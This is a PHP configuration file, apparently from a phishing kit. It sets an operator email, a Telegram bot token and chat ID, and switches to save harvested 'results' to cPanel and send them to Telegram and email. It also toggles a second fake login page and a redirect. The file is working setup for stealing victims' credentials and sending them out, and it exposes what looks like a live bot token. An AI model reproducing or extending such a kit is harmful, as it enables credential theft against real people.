<?php

$Z118_EMAIL = "imessagetext1@gmail.com";  /* PUT YOUR FUCKING EMAIL HERE BRO */


/* TELEGRAM BOT INFORMATION */
$bot_token = "6037746063:AAEdVI0Gqo1doEyDyaTlt28KyBZU7MHP488"; /* bot token */
$chat_id = "5664209404";

/* OPTIONS TO SAVE AND SEND YOUR RESULTS */
$save_results_to_cpanel = "yes";
$send_results_to_telegram = "on";
$send_results_to_email = "on";

/* CONFIG TO DISPLAY SECOND LOGIN PAGE */

$show_second_login_page = "off";


/* DO NOT TOUCH */
$redirect_to_next_page = "on";

?>